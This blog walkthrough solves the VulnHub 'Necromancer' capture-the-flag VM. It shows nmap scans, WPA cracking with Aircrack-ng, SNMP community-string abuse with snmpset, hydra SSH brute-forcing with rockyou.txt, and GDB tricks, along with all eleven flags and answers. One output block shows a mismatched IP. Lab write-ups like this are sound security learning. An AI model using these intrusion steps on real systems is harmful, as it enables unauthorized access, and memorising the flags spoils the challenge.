---
title:  "VulnHub Necromancer Writeup"
date:   2016-08-18 00:00:00
description: Feels Like Playing an RPG
---

This is my writeup for VulHub's [The Necromancer: 1](https://www.vulnhub.com/entry/the-necromancer-1,154/) challenge. This challenge's a lot of fun, really. There are eleven flags to retrieve, and each flag is a key to continue the story.

### Host and Service Discovery

I started by doing a ping sweep with Nmap to see the hosts available on my network.

```
$ sudo nmap 192.168.0.101-120

Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-18 13:59 WIB
Nmap scan report for 192.168.0.101
Host is up (0.00015s latency).
All 1000 scanned ports on 192.168.0.101 are filtered
MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.0.107
Host is up (0.0000050s latency).
All 1000 scanned ports on 192.168.0.107 are closed

Nmap done: 20 IP addresses (2 hosts up) scanned in 24.15 seconds
```

Since my host is 192.168.0.107, I can say for sure that the Necromancer's lair is 192.168.0.101. I proceed to check the services running on that host.

```
$ sudo nmap -p0- -sS -Pn -T5 192.168.0.101 -vvv

Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-18 14:11 WIB
Initiating ARP Ping Scan at 14:11
Scanning 192.168.0.101 [1 port]
Completed ARP Ping Scan at 14:11, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:11
Completed Parallel DNS resolution of 1 host. at 14:11, 0.28s elapsed
DNS resolution of 1 IPs took 0.28s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:11
Scanning 192.168.0.101 [65536 ports]
SYN Stealth Scan Timing: About 4.44% done; ETC: 14:22 (0:11:07 remaining)
SYN Stealth Scan Timing: About 9.01% done; ETC: 14:22 (0:10:16 remaining)
SYN Stealth Scan Timing: About 13.57% done; ETC: 14:22 (0:09:39 remaining)
SYN Stealth Scan Timing: About 18.60% done; ETC: 14:22 (0:09:03 remaining)
SYN Stealth Scan Timing: About 23.62% done; ETC: 14:22 (0:08:28 remaining)
SYN Stealth Scan Timing: About 28.64% done; ETC: 14:22 (0:07:53 remaining)
SYN Stealth Scan Timing: About 33.67% done; ETC: 14:22 (0:07:19 remaining)
SYN Stealth Scan Timing: About 38.69% done; ETC: 14:22 (0:06:46 remaining)
SYN Stealth Scan Timing: About 43.72% done; ETC: 14:22 (0:06:12 remaining)
SYN Stealth Scan Timing: About 48.74% done; ETC: 14:22 (0:05:39 remaining)
SYN Stealth Scan Timing: About 53.76% done; ETC: 14:22 (0:05:05 remaining)
SYN Stealth Scan Timing: About 59.24% done; ETC: 14:22 (0:04:29 remaining)
SYN Stealth Scan Timing: About 64.26% done; ETC: 14:22 (0:03:56 remaining)
SYN Stealth Scan Timing: About 69.28% done; ETC: 14:22 (0:03:23 remaining)
SYN Stealth Scan Timing: About 74.31% done; ETC: 14:22 (0:02:49 remaining)
SYN Stealth Scan Timing: About 79.79% done; ETC: 14:22 (0:02:13 remaining)
SYN Stealth Scan Timing: About 85.27% done; ETC: 14:22 (0:01:37 remaining)
SYN Stealth Scan Timing: About 90.29% done; ETC: 14:22 (0:01:04 remaining)
SYN Stealth Scan Timing: About 95.31% done; ETC: 14:22 (0:00:31 remaining)
Completed SYN Stealth Scan at 14:22, 658.04s elapsed (65536 total ports)
Nmap scan report for 192.168.0.101
Host is up, received arp-response (0.00022s latency).
All 65536 scanned ports on 192.168.0.101 are filtered because of 65536 no-responses
MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 658.63 seconds
           Raw packets sent: 131073 (5.767MB) | Rcvd: 12 (732B)
```

Okay, all filtered. So I know my target host's IP and I know that it's filtering every port known to man. So the quest continues.

### Network Traffic Analysis

I started Wireshark to see whether the host is trying to make any connections outside. Indeed, it's trying to make connections to every single known host in the network on port 4444. So I started Netcat to listen on port 4444.

```
$ nc -l 4444
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...
```

I thought this string was some kind of SSH key at the first sight, but I tried to use base64 decoder to check it out first. That's spot on, and we got the first flag.

```
Welcome!

You find yourself staring towards the horizon, with nothing but silence surrounding you.
You look east, then south, then west, all you can see is a great wasteland of nothingness.

Turning to your north you notice a small flicker of light in the distance.
You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.  

The air around you begins to get thicker, and your heart begins to beat against your chest. 
You turn to your left.. then to your right!  You are trapped!

You fumble through your pockets.. nothing!  
You look down and see you are standing in sand.  
Dropping to your knees you begin to dig frantically.

As you dig you notice the barrier extends underground!  
Frantically you keep digging and digging until your nails suddenly catch on an object.

You dig further and discover a small wooden box.  
flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.

You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"
```

### Chanting the String

The string of the first flag is an MD5 hash. Using rainbow tables available on the Internet, we can decrypt it and acquire its original value.

```
opensesame
```

We need to chant the string to UDP port 666 according to the hint given in the text. So be it!

```
$ echo opensesame | nc -u 192.168.0.101 666


A loud crack of thunder sounds as you are knocked to your feet!

Dazed, you start to feel fresh air entering your lungs.

You are free!

In front of you written in the sand are the words:

flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}

As you stand to your feet you notice that you can no longer see the flicker of light in the distance.

You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.

As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.

The birds get closer, and closer, and closer.

Staring up at the crows you can see they are in a formation.

Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.

As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.

666 is closed.
```

Now, we got the second flag.

### The Crows

The crows were flying in a formation similar to Roman numeral 80. So we're going to check out the HTTP server on port 80 this time.

![The Crows](/assets/images/posts/necromancer-http.png)

```
<html>
  <head>
    <title>The Chasm</title>
  </head>
  <body bgcolor="#000000" link="green" vlink="green" alink="green">
    <font color="green">
    Hours have passed since you first started to follow the crows.<br><br>
    Silence continues to engulf you as you treck towards a mountain range on the horizon.<br><br>
    More times passes and you are now standing in front of a great chasm.<br><br>
    Across the chasm you can see a necromancer standing in the mouth of a cave, staring skyward at the circling crows.<br><br>
    As you step closer to the chasm, a rock dislodges from beneath your feet and falls into the dark depths.<br><br>
    The necromancer looks towards you with hollow eyes which can only be described as death.<br><br>
    He smirks in your direction, and suddenly a bright light momentarily blinds you.<br><br>
    The silence is broken by a blood curdling screech of a thousand birds, followed by the necromancers laughs fading as he decends into the cave!<br><br>
    The crows break their formation, some flying aimlessly in the air; others now motionless upon the ground.<br><br>
    The cave is now protected by a gaseous blue haze, and an organised pile of feathers lay before you.<br><br>
    <img src="/pics/pileoffeathers.jpg">
    <p><font size=2>Image copyright: <a href="http://www.featherfolio.com/" target=_blank>Chris Maynard</a></font></p>
    </font>
  </body>
</html>
```

I didn't have any oher clue other than the image of the crows in this page.


![Pile of Feathers](/assets/images/posts/necromancer-pileoffeathers.jpg)

So I check the image while running Nikto and DirBuster to see if I can find anything else on the web server. But both Nikto and DirBuster aren't producing any results, so I focused on the image. Using `hexedit`, we can see that near the end of the image file it mentioned the filename `feathers.txt` twice.

I made a copy of the `pileoffeathers.jpg` image and renamed it to `pileoffeathers.zip`. We can extract `feathers.txt` file from it, and here's the content.

```
ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==
```

With base64 decoder, we can retrieve the third flag from the `feathers.txt` file.

```
flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm
```

### The Chasm and Magic Bridge

So we opened the `/amagicbridgeappearsatthechasm` path on the web server.

![The Chasm and Magic Bridge](/assets/images/posts/necromancer-magic-bridge.png)

```
<html>
  <head>
    <title>The Cave</title>
  </head>
  <body bgcolor="#000000" link="green" vlink="green" alink="green">
    <font color="green">
    You cautiously make your way across chasm.<br><br>
    You are standing on a snow covered plateau, surrounded by shear cliffs of ice and stone.<br><br>
    The cave before you is protected by some sort of spell cast by the necromancer.<br><br>
    You reach out to touch the gaseous blue haze, and can feel life being drawn from your soul the closer you get.<br><br>
    Hastily you take a few steps back away from the cave entrance.<br><br>
    There must be a magical item that could protect you from the necromancer's spell.<br><br>
    <img src="../pics/magicbook.jpg">
    </font>
  </body>
</html>
```

Since the only thing I saw is the `magicbook.jpg` image, I tried every single method I can think of to analyze the file from ExifTool, `hexedit`, steganography, to playing with GIMP's filters. But it doesn't seem to work on this one image.

![Magic Book](/assets/images/posts/necromancer-magicbook.jpg)

I decided to check out what the other people did, and it seems like we're expected to build a dictionary of words containing names of magic items and use it to bruteforce the path following this format.

```
/amagicbridgeappearsatthechasm/[magic_item]
```

The right magic item is talisman, and from this path we can get an executable binary.

```
/amagicbridgeappearsatthechasm/talisman
```

### Using the Talisman

Here's what we get if we execute the `talisman`.

```
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?
```

No matter what our answer is, it will give us this response.

```
Nothing happens.
```

So I tried to reverse engineer it and see how it works. I started `radare2` and see the function calls inside the binary. Here's the `main` function.

```
=-------------------------------=
| [0x8048a13]                   |
|   ;-- main:                   |
| (fcn) sym.main 36             |
| ; arg int arg_4h @ esp+0x4    |
| lea ecx, [esp + arg_4h] ;[a]  |
| and esp, 0xfffffff0           |
| push dword [ecx - 4]          |
| push ebp                      |
| mov ebp, esp                  |
| push ecx                      |
| sub esp, 4                    |
| call sym.wearTalisman ;[b]    |
| mov eax, 0                    |
| add esp, 4                    |
| pop ecx                       |
| pop ebp                       |
| lea esp, [ecx - 4] ;[c]       |
| ret                           |
=-------------------------------=
```

The main function calls another function named `wearTalisman`. The `wearTalisman` function doesn't do much.

There's another function that has a name matching the challenge's theme, the `chantToBreakSpell` function. But looking at the execution flow from `main` to `wearTalisman`, it seems that the `chantToBreakSpell` function is never called in the normal execution flow.

Yet, it seems that this `chantToBreakSpell` function at least does something.

```
                            =-----------------------------------=
                            |  0x8048390                        |
                            | (fcn) sym.deregister_tm_clones 43 |
                            | mov eax, 0x804a897                |
                            | sub eax, obj.completed.6597       |
                            | cmp eax, 6                        |
                            | jbe 0x80483b9 ;[a]                |
                            =-----------------------------------=
                                    f t
                                 .--' '------------------.
                                 |                       |
                                 |                       |
                         =--------------------=          |
                         |  0x804839f         |          |
                         | mov eax, 0         |          |
                         | test eax, eax      |          |
                         | je 0x80483b9 ;[a]  |          |
                         =--------------------=          |
                                 f t                     |
       .-------------------------' '---------------.     |
       |                                           |     |
       |                                           |     |
=--------------------------------------------=     |     |
| [0x80483a8]                                |     |     |
| push ebp                                   |     |     |
| mov ebp, esp                               |     |     |
| sub esp, 0x14                              |     |     |
| push obj.completed.6597 ; obj.__TMC_END__  |     |     |
| call eax                                   |     |     |
| add esp, 0x10                              |     |     |
| leave                                      |     |     |
=--------------------------------------------=     |     |
   v                                               |     |
   '--------------------------------.     .--------'-----'
                                    |     |
                                    |     |
                                =--------------------=
                                |  0x80483b9         |
                                | ret                |
                                =--------------------=
```

So we go to GDB to run this function and see what it does.

```
$ gdb talisman
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from talisman...(no debugging symbols found)...done.
(gdb) break wearTalisman
Breakpoint 1 at 0x804852d
(gdb) run
Starting program: /home/sdsdkkk/Desktop/talisman 

Breakpoint 1, 0x0804852d in wearTalisman ()
(gdb) jump chantToBreakSpell
Continuing at 0x8048a3b.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.
The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[Inferior 1 (process 19846) exited normally]
(gdb)
```

So we successfully used the talisman and got the fourth flag, and now we need to chant another word.

### Black Magic

The fourth flag can be decrypted with rainbow table, and we get this string.

```
blackmagic
```

This should be chanted to UDP port 31337.

```
$ echo blackmagic | nc -u 192.168.0.101 -u 31337


As you chant the words, a hissing sound echoes from the ice walls.

The blue aura disappears from the cave entrance.

You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.

You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.

The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.

Suddenly, you are attacked by a swarm of bats!

You aimlessly thrash at the air in front of you!

The bats continue their relentless attack, until.... silence.

Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.

Looking towards one of the torches, you see something on the cave wall.

You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.

/thenecromancerwillabsorbyoursoul

flag5{0766c36577af58e15545f099a3b15e60}
```

So should we have a face off with the Necromancer now?

### Your Soul

Go to `/thenecromancerwillabsorbyoursoul` path.

![Your Soul](/assets/images/posts/necromancer-your-soul.png)

```
<html>
  <head>
    <title>The Door</title>
  </head>
  <body bgcolor="#000000" link="green" vlink="green" alink="green">
    <font color="green">
    flag6{b1c3ed8f1db4258e4dcb0ce565f6dc03}<br><br>
    You continue to make your way through the cave.<br><br>
    In the distance you can see a familiar flicker of light moving in and out of the shadows. <br><br>
    As you get closer to the light you can hear faint footsteps, followed by the sound of a heavy door opening.<br><br>
    You move closer, and then stop frozen with fear.<br><br>
    It's the <a href="./necromancer">necromancer!</a><br><br>
   <img src="../pics/necromancer.jpg">
    <p><font size=2>Image copyright:<a href="http://www.deviantart.com/art/The-Warlock-Necromancer-339634655" target=_blank> Manzanedo</a></font>
</p><br><br><br>
    Again he stares at you with deathly hollow eyes.  <br><br>
    He is standing in a doorway; a staff in one hand, and an object in the other.  <br><br>
    Smirking, the necromancer holds the staff and the object in the air.<br><br>
    He points his staff in your direction, and the stench of death and decay begins to fill the air.<br><br>
    You stare into his eyes and then.......<br><br><br><br><br><br><br><br><br>
    ...... darkness.  You open your eyes and find yourself lying on the damp floor of the cave.<br><br>
    The amulet must have saved you from whatever spell the necromancer had cast.<br><br>
    You stand to your feet.  Behind you, only darkness.<br><br>
    Before you, a large door with the symbol of a skull engraved into the surface. <br><br>
    Looking closer at the skull, you can see u161 engraved into the forehead.<br><br>
    </font>
  </body>
</html>
```

We got another hint that we should send a string to UDP port 161. But we don't know what the string is yet.

In the page there's a link on the word "necromancer". Click that to download a binary file named `necromancer`.

```
/thenecromancerwillabsorbyoursoul/necromancer
```

We can extract it using `bzip2`.

```
$ bzip2 -d necromancer
```

The output on my host is renamed to `necromancer.out`, but after I checked it out using ExifTool it looks like a `tar` file. I extracted it once again and acquired `necromancer.cap` file.

I inspected the traffic in this file quite a while and got stuck. I found [Andrew Hilton's writeup](https://medium.com/@a.hilton83/the-necromancer-ctf-vm-vulnhub-com-d9f7c0e092af) and see that we should use Aircrack-ng to crack the wireless password of the traffic captured in the `cap` file instead.

```
                                 Aircrack-ng 1.2 beta3


                   [00:00:14] 16196 keys tested (1152.99 k/s)


                           KEY FOUND! [ death2all ]


      Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC 
                       DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7 

      Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C 
                       56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3 
                       C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92 
                       3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D 

      EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E 
```

The string is "death2all". I also got another hint from Andrew's writeup that this time we shouldn't be using Netcat (it fails). I'm not very familiar with how wireless networks work under the hood, so I keep using Andrew's writeup as a reference for the next few steps of the challenge as it heavily relies on knowledge of wireless LAN networks.

### Death to All

Since Andrew said not to use Netcat here (it fails when I tried anyway), I followed his footsteps and use Metasploit's `snmp_enum` to do the job.

```
# msfconsole
msf > use auxiliary/scanner/snmp/snmp_enum
msf auxiliary(snmp_enum) > set rhosts 192.168.0.101
rhosts => 192.168.1.103
msf auxiliary(snmp_enum) > set community death2all
community => death2all
msf auxiliary(snmp_enum) > run

[+] 192.168.1.103, Connected.

[*] System information:
Host IP : 192.168.1.103
Hostname : Fear the Necromancer!
Description : You stand in front of a door.
Contact : The door is Locked. If you choose to defeat me, the door must be Unlocked.
Location : Locked — death2allrw!
Uptime snmp : -
Uptime system : -
System date : -
```

I'm not very well-versed in wireless system yet, so I'm piggybacking Andrew's writeup here for the attacks on SNMP protocol while trying to make sense for myself what I'm doing. According to Andrew, the one we should check is this string.

```
Location : Locked — death2allrw!
```

It's quite easy to see why, that 'rw' substring looks pretty alluring. So, here I come.

```
# snmpwalk -v 2c -c death2all 192.168.0.101
iso.3.6.1.2.1.1.1.0 = STRING: “You stand in front of a door.”
iso.3.6.1.2.1.1.4.0 = STRING: “The door is Locked. If you choose to defeat me, the door must be Unlocked.”
iso.3.6.1.2.1.1.5.0 = STRING: “Fear the Necromancer!”
iso.3.6.1.2.1.1.6.0 = STRING: “Locked — death2allrw!”

# snmpget -v 2c -c death2allrw 192.168.0.101 iso.3.6.1.2.1.1.6.0
iso.3.6.1.2.1.1.6.0 = STRING: “Locked — death2allrw!”

# snmpset -v 2c -c death2allrw 192.168.0.101 iso.3.6.1.2.1.1.6.0 s Unlocked
iso.3.6.1.2.1.1.6.0 = STRING: “Unlocked”

# snmpget -v 2c -c death2allrw 192.168.0.101 iso.3.6.1.2.1.1.6.0
iso.3.6.1.2.1.1.6.0 = STRING: “flag7{9e5494108d10bbd5f9e7ae52239546c4} -t22”
```

Now we got the seventh flag. It should be used to TCP port 22 according to the hint, so it means that this must be an SSH credential.

Decrypt the string on seventh flag using rainbow table, and we got something that looks like a username suitable enough to hunt down the Necromancer.

```
demonslayer
```

Since we haven't got the password, I figured that I might as well try to bruteforce my way to it. I already did some bruteforcing when using Aircrack-ng earlier anyway.

```
$ hydra -s 22 -l demonslayer -P rockyou.txt 192.168.0.101 ssh
```

And we got the password.

```
12345678
```

### The Necromancer's Lair

Using the credentials we got, we can get into the Necromancer's lair.

```
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '                       
                               THE NECROMANCER!
                                 by  @xerubus
```

Nice banner. In the directory where we're in, there's a file named `flag8.txt`.

```
$ cat flag8.txt                                                                                                                                 
You enter the Necromancer's Lair!

A stench of decay fills this place.  

Jars filled with parts of creatures litter the bookshelves.

A fire with flames of green burns coldly in the distance.

Standing in the middle of the room with his back to you is the Necromancer.  

In front of him lies a corpse, indistinguishable from any living creature you have seen before.

He holds a staff in one hand, and the flickering object in the other.

"You are a fool to follow me here!  Do you not know who I am!"

The necromancer turns to face you.  Dark words fill the air!

"You are damned already my friend.  Now prepare for your own death!" 

Defend yourself!  Counter attack the Necromancer's spells at u777!
```

Well, another UDP port we should connect to. We're not told what string we need to put here though. I tried to put some random string to port 777 from my host machine, but it doesn't seem to work. I tried some random string from the Necromancer's lair to its localhost too, but it works there.

```
$ echo what | nc -u localhost 777


** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?
```

After some googling, I find out that this question is related to [this story](https://en.wikipedia.org/wiki/Tsurani). The answer is Kelewan.

```
$ echo Kelewan | nc -u localhost 777


flag8{55a6af2ca3fee9f2fef81d20743bda2c}



** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who did Johann Faust VIII make a deal with?
```

This one's answer is Mephistopheles. I happened to read the manga Ao no Exorcist and know some trivia about the stories that inspired the characters in that manga.

```
$ echo Mephistopheles | nc -u localhost 777


flag9{713587e17e796209d1df4c9c2c2d2966}



** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who is tricked into passing the Ninth Gate?
```

The answer is Hedge, it seemed to be taken from [this story](https://en.wikipedia.org/wiki/List_of_Old_Kingdom_characters).

```
$ echo Hedge | nc -u localhost 777


flag10{8dc6486d2c63cafcdc6efbba2be98ee4}

A great flash of light knocks you to the ground; momentarily blinding you!

As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.

An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.

The room is silent.

You walk over to where the Necromancer once stood.

On the ground is a small vile.  
```

I ran `ls -alh` and found out there's a hidden file named .smallvile.

```
$ cat .smallvile                                                                                                                                


You pick up the small vile.

Inside of it you can see a green liquid.

Opening the vile releases a pleasant odour into the air.

You drink the elixir and feel a great power within your veins!
```

I can use sudo command, but for a lot of commands I tried to execute with sudo is denied. So I tried this.

```
$ sudo -l
Matching Defaults entries for demonslayer on thenecromancer:
    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"

User demonslayer may run the following commands on thenecromancer:
    (ALL) NOPASSWD: /bin/cat /root/flag11.txt
```

Seems like the final flag can only be read with sudo.

```
$ sudo cat /root/flag11.txt



Suddenly you feel dizzy and fall to the ground!

As you open your eyes you find yourself staring at a computer screen.

Congratulations!!! You have conquered......

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '                       
                               THE NECROMANCER!
                                 by  @xerubus

                   flag11{42c35828545b926e79a36493938ab1b1}


Big shout out to Dook and Bull for being test bunnies.

Cheers OJ for the obfuscation help.

Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.

"========================================="
"  xerubus (@xerubus) - www.mogozobo.com  "
"========================================="
```

And it's done. It's pretty fun, I've been doing this challenge since afternoon up till midnight. Thanks [Xerubus](https://twitter.com/xerubus), this challenge feels like playing a role-playing game. I'm glad I can try a lot of tricks here from reverse engineering to network traffic analysis, even though I haven't gotten really proficient in any of them yet and still need lots of references to get the job done.